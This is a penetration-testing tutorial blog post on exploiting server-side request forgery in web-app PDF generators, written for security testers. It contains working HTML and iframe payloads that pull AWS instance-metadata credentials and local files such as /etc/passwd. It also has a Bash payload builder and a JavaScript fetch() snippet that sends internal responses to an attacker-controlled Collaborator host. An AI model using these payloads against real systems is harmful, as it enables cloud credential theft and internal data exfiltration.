---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-11_hunting-for-ssrf-bugs-in-pdf-generators.md
original_filename: 2024-01-11_hunting-for-ssrf-bugs-in-pdf-generators.md
title: Hunting for SSRF Bugs in PDF Generators
category: documents
detected_topics:
- ssrf
- cloud-security
- xss
- command-injection
- sso
- cors
tags:
- imported
- documents
- ssrf
- cloud-security
- xss
- command-injection
- sso
- cors
language: en
raw_sha256: 5d9bfd1dbfe0ae21e375bcf67027313bdfc236e512cc2075d7aa8b59dd4ae7aa
text_sha256: cf607c1008a80f5a080b41cee8f4bf1cfc642d0de9005ca81f7bc220e909343f
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: false
---

# Hunting for SSRF Bugs in PDF Generators

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-11_hunting-for-ssrf-bugs-in-pdf-generators.md
- Source Type: markdown
- Detected Topics: ssrf, cloud-security, xss, command-injection, sso, cors
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: False
- Raw SHA256: `5d9bfd1dbfe0ae21e375bcf67027313bdfc236e512cc2075d7aa8b59dd4ae7aa`
- Text SHA256: `cf607c1008a80f5a080b41cee8f4bf1cfc642d0de9005ca81f7bc220e909343f`


## Content

---
title: "Hunting for SSRF Bugs in PDF Generators"
page_title: "Hunting for SSRF Bugs in PDF Generators  - Black Hills Information Security, Inc."
url: "https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/"
final_url: "https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/"
authors: ["Sean Verity (@SeanVerity)"]
bugs: ["SSRF"]
publication_date: "2024-01-11"
added_date: "2024-02-01"
source: "pentester.land/writeups.json"
original_index: 557
---

11 Jan 2024

[How-To](https://www.blackhillsinfosec.com/category/how-to/), [Sean Verity](https://www.blackhillsinfosec.com/category/author/sean-verity/), [Web App](https://www.blackhillsinfosec.com/category/red-team/web-app/)

# [Hunting for SSRF Bugs in PDF Generators ](https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/Untitled-design-3-150x150.png)

| [Sean Verity](https://www.blackhillsinfosec.com/team/sean-verity/)

_Sean Verity began working for Black Hills Information Security (BHIS) in March of 2022 as a Security Analyst. Sean is excited to be on a team with like-minded individuals and to participate in passing on knowledge. Outside of work, Sean enjoys laughing at his wife’s jokes, hunting, mountain biking, and all things outdoors._

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/BLOG_chalkboard_00651-1024x576.png)

If you’ve been on a website and noticed one of the following features, there’s a good chance you’ve stumbled upon a hot spot for server-side request forgery (SSRF) bugs: 

  * Print a certificate of completion 
  * Generate a report 
  * Submit a digital signature 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs01.png)

Before getting into the nuts ‘n’ bolts of how to find and exploit SSRF bugs in PDF generators, let’s go through a quick thought experiment. I want to give you a simple mental snapshot of what is going on when a PDF is generated in a web application.

Imagine that you saved a very basic web page into an HTML file on your desktop and named it `ssrf.html`. The web page uses JavaScript to fetch an image and add it to the web page. It looks like this.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs02.png)

Then, imagine opening that HTML file and saving it to a PDF with your web browser’s Print feature.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/2023-12-11_10-59-03.gif)

The browser parsed HTML, executed JavaScript, and requested a remote image file to generate a PDF. As you can imagine, there could be some serious implications if an attacker can influence the HTML that the PDF is generated from. Here are a few things you could attack with an SSRF bug:

  * **IMDS:** If the server is hosted in the cloud (e.g. AWS, Azure, or GCP), there’s a good chance you’ll be able to interact with its instance metadata service (IMDS). If luck is on your side and AWS IMDSv1 is enabled, you’ll probably be able to leak AWS temporary security credentials from the IAM endpoint or plaintext credentials from the user-data endpoint.
  * **PDF Generator:** The PDF generating component itself may be vulnerable.
  * **Host / Service Discovery:** You will almost certainly be able to interact with other services running on the server or systems that are not publicly accessible.

### Where to Start?

Look at the PDF and take note of any data in it that you provided to the application such as name, address, digital signature, etc. These are good parameters to investigate. During your investigation, there are a few questions you’ll want to answer:

  * Can I inject HTML?
  * Can I access remote servers?
  * Can I execute JavaScript?
  * Is the server that’s rendering my PDF cloud hosted?
  * Are there any known vulnerabilities in the component that’s generating the PDF?
  * What other services or systems can I interact with?
  * Am I giving it enough time? 
  * This last question is actually a story to highlight a challenge and solution I encountered while hunting an elusive SSRF bug. The lesson might prove useful if you find yourself in a similar situation.

As you work through testing potential sources, you’ll either get visual cues in the generated PDF, callbacks to an out-of-band server like Burp Collaborator1, or a combination thereof.

If you’ve ever exploited a cross-site scripting (XSS) vulnerability, the first few questions should be familiar. Exploiting SSRF bugs in PDF generators is very much like exploiting XSS bugs. The big difference is that you don’t have the DOM right in front of you since it’s all happening on the server. The mindset is very similar though.

### Can I inject HTML?

There are three likely contexts where your payload is landing on the server:

  1. In between HTML tags
  2. Wrapped with apostrophes, inside an HTML entity attribute
  3. Wrapped with quotation marks, inside an HTML entity attribute

As alluded to earlier, you probably won’t see what you’re injecting into so you’ll have to do some investigation to determine which context your payload is landing in. Payloads (highlighted) are shown in the code blocks that follow. If a given payload renders, then you know what context your payload is landing in.

A quick note on the last two contexts, where your payload is landing inside of an HTML entity attribute. If you have a Pro license for Burp, an automated scan finding of “External HTTP Interaction” is likely indicative of the last two contexts. If you don’t have a Pro license, try pasting a URL to an image into the payload position. If the image appears in the PDF, that’s also a pretty good indication that your payload is landing in one of the last two contexts.

_In between HTML tags_

Your payload might be landing in between a couple of HTML tags. In which case, try injecting one or two HTML elements. Using two elements can be handy because if the HTML is rendered, you’ll get a visual cue in the PDF that your HTML was rendered.
  
  
  <body>
  <h1>Congratulations!</h1>
  **< h1>Big Header</h1><h5>Small Header</h5>**
  </body>
  

_Wrapped with apostrophes, inside an HTML entity attribute_
  
  
  <body>
  <h1>Congratulations!</h1>
  <img src='**'/ ><h1>Big Apostrophe</h1><h5>Little Apostrophe</h5>**'></img>
  </body>
  

_Wrapped with quotation marks, inside an HTML entity attribute_
  
  
  <body>
  <h1>Congratulations!</h1>
  <img src="**"/ ><h1>Big Quotation Mark</h1><h5>Little Quotation Mark</h5>**"></img>
  </body>
  

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs05.png)_Pitfall!_ Atari 2600, 1982.

**WARNING:** When checking for the last context, quotation marks, be mindful of your request type. JSON is a very common request format that you’ll come across. Don’t forget to escape the quotation marks!

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs06.png)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs07.png)

It’s important to figure out which context your payload is landing in, because if there’s a syntax error, you might see an error message, or you might not see anything at all.

### Can I access remote servers?

As mentioned before, try pasting a URL into the payload position that you’re investigating. If it fetches the remote resource or interacts with your Bup Collaborator, then you know that the server you’re testing can access remote servers.

If you determined that your payload is landing in between two HTML tags, though, try something like the following: 
  
  
  <body>
  <h1>Congratulations!</h1>
  **< img src="{{URL_IMAGE_OR_BURP_COLLABORATOR}}"></img>**
  </body>
  

I’d also like to highlight a feature that you might not expect to be vulnerable to SSRF. Digital signatures are an unexpected place for SSRF, but keep an eye out for requests that include something like this:
  
  
  data:image/png;base64,{{BASE64_ENCODED_BLOB}}

That’s the start of a data URL2, which is a way that an application can embed images inline as opposed to fetching them from a remote server. Here’s what a vulnerable server is likely expecting:
  
  
  <body>
  <h1>Proof that you Signed Your Life Away</h1>
  <img src=**"data:image/png;base64,{{BASE64_ENCODED_DIGITAL_SIGNATURE}}** "></img>
  </body>
  

Since the data URL is just a source for an image element, try replacing the data URL with a URL that points to a remote resource.

### Can I execute JavaScript?

At this point, you’ve figured out where your payload is landing and verified that the server can pull down remote resources. Next, you could check for JavaScript execution. My go-to method is to use something like this.
  
  
  <body>
  <h1>Proof that you Signed Your Life Away</h1>
  <img src="**" ><body id="body">	<script>jsImg = new Image();jsImg.src="https://www.blackhillsinfosec.com/wp-content/uploads/2016/03/BHIS-logo-L.png";document.getElementById("body").appendChild(jsImg);</script></body>**"></img>
  </body>
  

If you see the BHIS logo3 in the rendered PDF, then you know that the JavaScript executed.

Now, something to keep in mind. As when testing for XSS, there’s a chance that injecting a <script> tag will get rejected by the application. You might need to inject JavaScript using another technique such as through an event handler. The following payload won’t render an image in a PDF, but it will prove JavaScript execution if you see a callback in Burp Collaborator. Be sure to update the URL with a domain name that you can monitor for callbacks.
  
  
  <body>
  <h1>Proof that you Signed Your Life Away</h1>
  <img src="**" ><img src="a" onerror='var jsImg = new Image; jsImg.src="https://{{YOUR_BURP_COLLAB_URL_HERE}}";'></img>**"></img>
  </body>
  

### Is the server that’s rendering my PDF cloud hosted?

A classic attack for showing the impact of an SSRF is to leak AWS IAM temporary security credentials from the instance metadata service (IMDS). Specifically, you’ll want to determine if the server is hosted in AWS and configured to support IMDS version 1. Under these circumstances, you’ll likely be able to leak temporary security credentials into the PDF. You will need to initiate at least two requests to leak an AWS access key. The first request is to leak the IAM role name. Use an iframe element to see the response in the PDF.
  
  
  <body>
  <h1>Proof that you Signed Your Life Away</h1>
  <img src="**" ><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials></iframe>**
  "></img>
  </body>

The second request is to leak the security credentials. Copy the IAM role name from the PDF and add it to the snippet, below.
  
  
  <body>
  <h1>Proof that you Signed Your Life Away</h1>
  <img src="**" ><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/{{SECURITY_ROLE_ID}}></iframe>**
  "></img>
  </body>
  

If you see something that resembles the following in your PDF, then you leaked an AWS access key that can potentially be used for pivoting to other resources in the AWS account.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs08.png)

Besides AWS access keys, see if there is any sensitive data in the user-data IMDS end point. BHIS has often found scripts containing cleartext credentials and secrets at the user-data endpoint. See the following for more ideas on how to pillage the AWS IMDS4.

### Are there any known vulnerabilities in the component that’s generating the PDF?

Recently, I found an SSRF bug where the PDF was rendered by headless Chrome5. During my investigation, I found out that it is not uncommon for applications to generate PDFs through headless Chrome either6. I was tipped off by the User-Agent request header, which also included the Chrome version number. To my dismay, it was fully patched. If you’re lucky though, you may come across an unpatched version that could be exploited for remote code execution7 or to leak files from the server8.

The other place to check for the component name and version is in the metadata of the PDF itself.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs09.png)

This example wasn’t vulnerable, but it’s worth your time to do a quick web search for vulnerabilities in the component you’re testing.

### What other services or systems can I interact with?

This question is very open ended and context dependent, but here are some things to think about:

  * Did you come across any hostnames during reconnaissance that didn’t resolve?
  * Were there any private IP addresses found in the application?
  * Have you come across any clues that container technology might be in play?
  * Are you on a multi-part assessment where another tester is hacking from the inside? 
  * To show greater impact, maybe you could collaborate to show how the SSRF could be leveraged to exploit a vulnerability on the internal network from the outside.

It would be very tedious to check each of these individually. Luckily, SSRF bugs in PDF generators oftentimes allow us to check many systems with a single request, using a stack of `iframes`. The major caveat with this approach is that you might not see a response in the PDF document depending on what framing protections are enabled on the target system9 10.

To send a stack of `iframes`, I like to start with a list of common SSRF targets and hostnames. Here’s an example starter list. Take a look at PayloadAllTheThings11 to generate a more comprehensive list.
  
  
  http://169.254.169.254/latest/
  http://169.254.169.254.xip.io/
  http://127.0.0.1:80
  http://127.0.0.1:443
  http://127.0.0.1:22
  http://0.0.0.0:80
  http://0.0.0.0:443
  http://0.0.0.0:22
  http://localhost:80
  http://localhost:443
  http://localhost:22
  file:///etc/passwd
  file://Windows/win.ini
  

Next, I’ll use the following Bash function to wrap each SSRF target inside of an `iframe`. To keep things organized, I also include a header element. The header element will appear in the PDF so that you can see which payload yielded a response. If you use this script, remember to adjust the `CRADLE_OPEN` and `CRADLE_CLOSE` variables based on where your payload is landing. The script below would be appropriate if your payload was landing in between HTML tags.
  
  
  HDR_OPEN='<h1>'
  HDR_CLOSE='</h1>'
  
  CRADLE_OPEN="<iframe src='"
  CRADLE_CLOSE="' width='1000' height='1000'></iframe>"
  
  make_payload () {
  printf $HDR_OPEN$1$HDR_CLOSE$CRADLE_OPEN$1$CRADLE_CLOSE
  }
  

Finally, loop through the SSRF payload file to generate a “super” payload that you can copy into an HTTP request.
  
  
  for target in `cat SSRF_targets.lst`; do make_payload $target; done

Here’s what the final payload could look like in a request.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs10.png)

Here’s an example PDF that was generated during an assessment, using this technique.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs11.png)

### Am I giving it enough time?

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/SSRFbugs12.png)

On a recent assessment, I found an SSRF bug on an AWS server where I almost didn’t leak AWS temporary security credentials. During an initial investigation, I sent a “super” payload and saw a response in my PDF for the `http://169.254.169.254/latest/` endpoint. But when I tried to access the `http://169.254.169.254/latest/meta-data/iam/security-credentials` endpoint in isolation from the rest of the “super” payload, my PDF was empty.

My first troubleshooting step was to see if I could at least view the parent directory. That didn’t work so I sent the original IMDS endpoint, `http://169.254.169.254/latest/,` since I had proof of accessing it. My PDF was still empty when trying to view the original IMDS endpoint in isolation.

This made no sense, so I thought that maybe the customer had patched it. Just to be sure though, I went back and sent the original “super” payload. The “super” payload still returned a response from the IMDS. I thought about why I could see a response when sending the “super” payload versus sending the payload for the IMDS endpoint in isolation. I figured that since the “super” payload was framing numerous sites, it took longer to render. Perhaps the extra time to render allowed enough time to fetch a response from the IMDS before generating the PDF. I tried delaying execution with JavaScript’s `setTimeout()` function12, using various delays between two and 30 seconds. Delaying via JavaScript had no bearing on the response time from the server and the PDF was still empty. Perhaps there was something different about how the delay was caused. I modified the original “super” payload to include ten iframes to the `http://169.254.169.254/latest/meta-data/iam/security-credentials` endpoint and it worked. I could see the AWS IAM role name on all ten pages of the PDF, so I modified the request to retrieve temporary security credentials for the role.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2024/01/were-right-back-where-we-started-dr-jud-bellamin.gif)

While testing for interaction with other systems, I used JavaScript’s fetch() API to initiate requests and send the responses (when allowed by a CORS policy) to my Burp Collaborator server
  
  
  async function requestToTarget() {
  let response = await fetch("/{{ENDPOINT_ON_TARGET}}");
  let dataFromTarget = await response.json();
  return dataFromTarget;
  }
  
  async function uploadToCollaborator() {
  let dataToExfiltrate = await requestToTarget();
  fetch(
  "https://{{COLLABORATOR_DOMAIN}} ", {
  method: "POST",
  body: JSON.stringify(dataToExfiltrate)
  }
  )
  }
  
  uploadToCollaborator()
  

With ten iframes, I was not seeing any interaction with Burp Collaborator. After bumping up to 100 iframes, I started seeing interaction with Burp Collaborator. I concluded that this must have delayed the PDF generator long enough to execute the JavaScript and send the response to Collaborator.

I have no idea why causing a delay with a lot iframes worked whereas JavaScript didn’t. Only sharing in case you run into this situation. Maybe the same could be accomplished with other elements like images. Let me know if you know why or have an alternative solution!

### Closing Thoughts

When it comes to finding and exploiting SSRF bugs in PDF generators, there’s a good chance that the payload and trigger will be sent asynchronously. The first time I found an SSRF bug, the vulnerable parameter was sent in one request, but the trigger for the SSRF was two requests later and it was not immediately obvious which request was triggering the SSRF bug. Hopefully you’re convinced that it’s worth it to go the extra mile to look for that elusive SSRF bug – happy hunting!

## Helpful Resources

  * <https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent>
  * <https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/>
  * <https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/>
  * <https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815>
  * <https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af>
  * <https://hackerone.com/reports/2262382?s=09>

## References

  1. https://portswigger.net/burp/documentation/collaborator ↩︎
  2. https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs ↩︎
  3. The link to the BHIS logo was valid at the time this blog was written. For this technique, make sure you are using a URL to an existent image. ↩︎
  4. https://blog.checkpoint.com/security/aws-instance-metadata-service-imds-best-practices/ ↩︎
  5. https://developer.chrome.com/blog/headless-chrome ↩︎
  6. https://blog.grio.com/2020/08/understanding-pdf-generation-with-headless-chrome.html ↩︎
  7. https://portswigger.net/daily-swig/severe-chrome-bug-allowed-rce-on-devices-running-remote-headless-interface ↩︎
  8. https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE ↩︎
  9. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors ↩︎
  10. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options ↩︎
  11. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery ↩︎
  12. https://developer.mozilla.org/en-US/docs/Web/API/setTimeout ↩︎

* * *

* * *

Ready to learn more? 

Level up your skills with affordable classes from Antisyphon!

**[Pay-What-You-Can Training](https://www.antisyphontraining.com/pay-forward-what-you-can/)**

Available live/virtual and on-demand

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/Antisyphon-Training-Powered-By-BHIS-blk-500x260.jpeg)

* * *

* * *
